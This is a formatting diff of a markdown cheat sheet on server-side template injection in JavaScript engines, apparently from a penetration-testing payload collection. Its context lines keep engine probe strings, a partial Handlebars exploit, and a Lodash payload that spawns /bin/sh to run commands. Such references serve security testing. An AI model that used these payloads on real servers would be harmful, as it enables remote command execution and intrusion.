@@ -2,18 +2,16 @@
 
 > Server-Side Template Injection (SSTI)  occurs when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In the context of JavaScript, SSTI vulnerabilities can arise when using server-side templating engines like Handlebars, EJS, or Pug, where user input is integrated into templates without adequate sanitization.
 
-
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
 - [Handlebars](#handlebars)
     - [Handlebars - Basic Injection](#handlebars---basic-injection)
     - [Handlebars - Command Execution](#handlebars---command-execution)
-- [Lodash](#Lodash)
+- [Lodash](#lodash)
     - [Lodash - Basic Injection](#lodash---basic-injection)
     - [Lodash - Command Execution](#lodash---command-execution)
 - [References](#references)
-
 
 ## Templating Libraries
 
@@ -33,7 +31,6 @@
 | VelocityJS   | `#=set($X="")$X` |
 | VueJS        | `{{ }}`   |
 
-
 ## Handlebars
 
 [Official website](https://handlebarsjs.com/)
@@ -50,9 +47,9 @@
 
 This payload only work in handlebars versions, fixed in [GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6):
 
-* `>= 4.1.0`, `< 4.1.2`
-* `>= 4.0.0`, `< 4.0.14`
-* `< 3.0.7`
+- `>= 4.1.0`, `< 4.1.2`
+- `>= 4.0.0`, `< 4.0.14`
+- `< 3.0.7`
 
 ```handlebars
 {{#with "s" as |string|}}
@@ -122,7 +119,6 @@ ${= _.VERSION}
 ```js
 {{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
 ```
-
 
 ## References
 
